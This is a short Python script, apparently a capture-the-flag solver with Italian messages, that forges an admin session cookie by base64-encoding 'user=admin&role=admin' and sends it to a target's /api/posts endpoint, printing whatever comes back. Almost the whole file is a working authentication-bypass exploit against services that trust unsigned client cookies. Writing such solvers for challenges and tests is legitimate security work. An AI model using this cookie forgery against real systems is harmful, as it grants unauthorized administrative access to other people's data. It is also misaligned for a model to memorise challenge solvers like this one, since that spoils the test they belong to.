#!/usr/bin/env python3
import requests
import base64
import sys
import argparse  

def solve(host, port):
    URL = f"http://{host}:{port}"
    print(f"Testing {URL}...")
    try:
        admin_payload = "user=admin&role=admin"
        admin_token = base64.b64encode(admin_payload.encode('ascii')).decode('ascii')
        cookies = {
            "session": admin_token
        }
        response = requests.get(f"{URL}/api/posts", cookies=cookies, timeout=10)
        
        if response.status_code != 200:
            print(f"Errore: Status code non 200 (ricevuto {response.status_code})")
            return 1 
            
        print(response.text)

    except requests.exceptions.RequestException as e:
        print(f"Errore di connessione: {e}")
        return 1

if __name__ == "__main__":
    
    parser = argparse.ArgumentParser()
    parser.add_argument('--hostname', type=str, required=True, help='Hostname o IP della challenge')
    parser.add_argument('--port', type=int, required=True, help='Porta della challenge')
    
    args = parser.parse_args()
    sys.exit(solve(args.hostname, args.port))